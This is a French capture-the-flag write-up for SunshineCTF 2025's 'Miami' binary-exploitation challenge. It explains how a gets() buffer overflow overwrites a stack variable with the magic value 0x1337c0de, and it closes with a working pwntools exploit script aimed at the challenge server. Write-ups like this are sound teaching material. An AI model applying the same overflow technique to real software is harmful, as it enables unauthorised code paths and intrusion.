# [SunshineCTF 2025] Miami - Write-up

## Informations sur le Challenge

- **CTF :** SunshineCTF 2025
- **Challenge :** Miami
- **Catégorie :** Pwn / Binary Exploitation

## 1. Analyse Statique

La première étape consiste à analyser le binaire `miami` sans l'exécuter pour recueillir des informations cruciales.

### Vérification des protections

La commande `checksec` nous donne un aperçu des mesures de sécurité compilées dans le binaire.

```bash
$ checksec miami
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
```

Points importants à noter :
- **No canary found** : C'est une information capitale. L'absence de canari sur la pile indique une vulnérabilité potentielle à un buffer overflow classique, car aucune valeur de protection n'est placée avant l'adresse de retour.
- **NX enabled** : Nous ne pourrons pas exécuter de shellcode directement sur la pile.
- **PIE enabled** : Les adresses du binaire sont randomisées, ce qui complique les attaques de type *ret2libc* ou l'appel direct à des adresses statiques.

### Recherche de chaînes de caractères

L'outil `strings` permet d'extraire les chaînes de caractères lisibles, ce qui peut révéler des indices sur les fonctionnalités du programme.

```bash
$ strings miami
...
flag.txt
Enter Dexter's password:
Invalid credentials!
Access granted...
vuln
read_flag
...
```

Cette sortie est très prometteuse. Nous voyons :
- `flag.txt` : Le nom du fichier que nous cherchons à lire.
- `vuln` : Le nom d'une fonction, probablement là où se trouve la faille.
- `read_flag` : Le nom d'une fonction qui, très certainement, lit et affiche le contenu de `flag.txt`. Notre objectif est donc d'arriver à exécuter cette fonction.

## 2. Analyse Dynamique et Découverte de la Vulnérabilité

En exécutant le programme, il nous demande un mot de passe. Sachant qu'il n'y a pas de canari et que la fonction `gets` est souvent utilisée dans ce type de challenge, l'hypothèse d'un simple buffer overflow pour écraser l'adresse de retour (technique *ret2win*) est la première à tester.

Cependant, en utilisant GDB avec un motif cyclique (par exemple, généré avec `cyclic(100)`), on constate que le programme plante bien, mais le pointeur d'instruction (`$RIP`) ne pointe pas sur notre chaîne. Il reste à l'intérieur de la fonction `vuln`.

```gdb
(gdb) r
Starting program: ./miami
Enter Dexter's password: [long pattern here]

Program received signal SIGSEGV, Segmentation fault.
0x00005555555553b5 in vuln ()
(gdb) info registers rip
rip            0x5555555553b5      0x5555555553b5 <vuln+179>
```

Cela signifie que le crash se produit *avant* que la fonction ne retourne. L'hypothèse du *ret2win* est donc incorrecte. Pour comprendre la cause, il faut examiner le code assembleur de la fonction `vuln`.

## 3. Explication de la Vulnérabilité : La Porte Dérobée

Le désassemblage de la fonction `vuln` dans GDB révèle le véritable mécanisme du challenge.

```gdb
(gdb) disassemble vuln
```

Voici les instructions clés :

1.  **Initialisation d'une variable locale :**
    ```asm
    0x000055555555530e <+12>:    movl   $0xdeadbeef,-0x4(%rbp)
    ```
    Une variable sur la pile, à l'adresse `-0x4(%rbp)`, est initialisée avec la valeur `0xdeadbeef`.

2.  **Lecture de l'entrée utilisateur :**
    ```asm
    0x0000555555555370 <+110>:   lea    -0x50(%rbp),%rax
    0x000055555555537c <+122>:   call   <gets@plt>
    ```
    Notre entrée est lue via `gets` et stockée dans un buffer à l'adresse `-0x50(%rbp)`.

3.  **La comparaison secrète :**
    ```asm
    0x0000555555555381 <+127>:   cmpl   $0x1337c0de,-0x4(%rbp)
    0x0000555555555388 <+134>:   je     0x55555555539b <vuln+153>
    ```
    C'est le cœur du challenge. Le programme compare la variable à `-0x4(%rbp)` avec une valeur "magique" : `0x1337c0de`. Si la comparaison est égale (`je` pour *Jump if Equal*), le programme saute à une autre partie du code.

4.  **L'appel à `read_flag` :**
    ```asm
    ; Code atteint après le saut
    0x00005555555553af <+173>:   call   0x555555555209 <read_flag>
    ```
    Si le saut est effectué, la fonction `read_flag` est appelée !

Le challenge n'est donc pas une exploitation de type *ret2win*, mais une **porte dérobée logique**. L'objectif est d'utiliser le buffer overflow provoqué par `gets` pour écraser la variable initialement à `0xdeadbeef` avec la valeur `0x1337c0de`.

## 4. Exploitation

Pour construire notre payload, nous devons calculer la distance entre le début de notre buffer et la variable cible.

-   Début du buffer : `-0x50` par rapport à `$rbp`.
-   Variable cible : `-0x4` par rapport à `$rbp`.
-   Distance : `0x50 - 0x4 = 0x4C` (hexadécimal), soit **76 octets**.

Notre payload final sera donc :
1.  76 octets de remplissage (padding).
2.  La valeur magique `0x1337c0de`, encodée sur 4 octets en *little-endian*.

## 5. Script de Solution

Le script `pwntools` suivant automatise l'envoi de ce payload au service distant pour récupérer le flag.

```python
from pwn import *

# Connexion au service distant du CTF
# Pour tester en local, utiliser : p = process('./miami')
p = remote('chal.sunshinectf.games', 25601)

# L'offset calculé pour atteindre la variable cible sur la pile
offset = 76

# La valeur magique qui déclenche la porte dérobée.
# p32() l'encode sur 4 octets (32 bits) au format little-endian,
# ce qui correspond à l'instruction `cmpl` (compare long).
magic_value = p32(0x1337c0de)

# Construction du payload final
payload = b'A' * offset + magic_value

# Attendre le prompt "Enter Dexter's password:"
p.recvuntil(b':')

# Envoyer le payload
p.sendline(payload)

# Passer en mode interactif pour lire la sortie et récupérer le flag
p.interactive()

```

## Conclusion

Ce challenge était une excellente introduction aux vulnérabilités qui sortent des sentiers battus. Au lieu d'une exploitation classique, il fallait analyser attentivement le code assembleur pour découvrir une porte dérobée logique. La leçon principale est de ne jamais faire d'hypothèses et de toujours vérifier le comportement du programme avec un désassembleur.